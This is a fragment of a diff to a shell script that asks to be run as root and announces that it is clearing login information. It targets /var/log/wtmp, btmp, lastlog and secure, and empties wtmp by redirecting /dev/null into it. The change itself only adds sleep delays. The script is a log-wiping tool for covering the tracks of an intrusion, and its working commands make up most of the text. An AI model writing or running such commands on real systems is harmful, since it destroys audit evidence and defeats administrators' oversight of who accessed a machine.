@@ -12,19 +12,25 @@ echo "#                              #"
 echo "################################"
 echo "# # # # # # # # # # # # # # # #"
 echo "!!!Please enter ROOT to work!!!"
-
+sleep 1s
 echo "# # # # # # # # # #"
+sleep 1s
 echo "# # # # # # # #"
+sleep 1s
 echo "# # # # # #"
+sleep 1s
 echo "# # # #"
+sleep 1s
 echo "# #"
+sleep 1s
 #---------------------------------------#
 echo "Clearing login information ..."
-sleep 1s
 wtmp='/var/log/wtmp'
 btmp='/var/log/btmp'
 lastlog='/var/log/lastlog'
 secure='/var/log/secure'
+
+sleep 1s
 
 if [ -e $wtmp ] ; then
    cat /dev/null > $wtmp 2>/dev/null && echo 'The [wtmp] is clear'
